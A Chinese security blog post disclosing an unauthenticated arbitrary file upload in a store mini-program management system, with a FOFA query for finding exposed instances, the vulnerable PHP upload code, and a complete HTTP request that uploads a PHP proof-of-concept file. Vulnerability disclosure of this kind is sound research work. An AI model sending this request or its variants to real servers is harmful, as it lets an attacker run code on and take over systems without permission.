---
title: "万能门店小程序管理系统 /comadmin/Remote/onepic_uploade 文件上传漏洞"
source: https://mrxn.net/jswz/api-wxapps-onepic_uploade-fileupload.html
asset_dir: assets/万能门店小程序管理系统-comadminremoteonepic_uploade-文件上传漏洞
---

# 万能门店小程序管理系统 /comadmin/Remote/onepic\_uploade 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/19 08:10
* 564浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

数据库

企业安全咨询

物流软件安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统的 comadmin/Remote/onepic\_uploade 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意文件，执行任意代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/comadmin/controller/Remote.php

```
//单个图片上传操作
    function onepic_uploade($file){
        $thumb = request()->file($file);
        if(isset($thumb)){
            $dir = upload_img();
            $info = $thumb->move($dir); 
            if($info){  
                $imgurl = ROOT_HOST."/upimages/".date("Ymd",time())."/".$info->getFilename();
                return $imgurl;
            }  
        }
    }
//定义上传图片的默认路径
function upload_img()
{
    //1.设置上传路径
    $dir = ROOT_PATH . "public/upimages/";
    return $dir;
}
```

直接调用thinkphp的 file 方法对上传文件直接处理后保存在 upload\_img 设置的文件夹并返回上传后的完整路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz

------WebKitFormBoundaryBiKyL9D0p5OtH5zz
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
```

深入探索

服务器安全服务

Web安全课程

漏洞扫描服务

[![万能门店小程序管理系统 /comadmin/Remote/onepic_uploade 文件上传漏洞](images/img-001-0b508e97afd2.webp)](https://image.mrxn.net/05fb87ecde024365bdac0dba0052324f.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /comadmin/Remote/onepic\_uploade 文件上传漏洞](https://mrxn.net/jswz/api-wxapps-onepic_uploade-fileupload.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-onepic_uploade-fileupload.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-onepic\_uploade-fileupload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全运维咨询

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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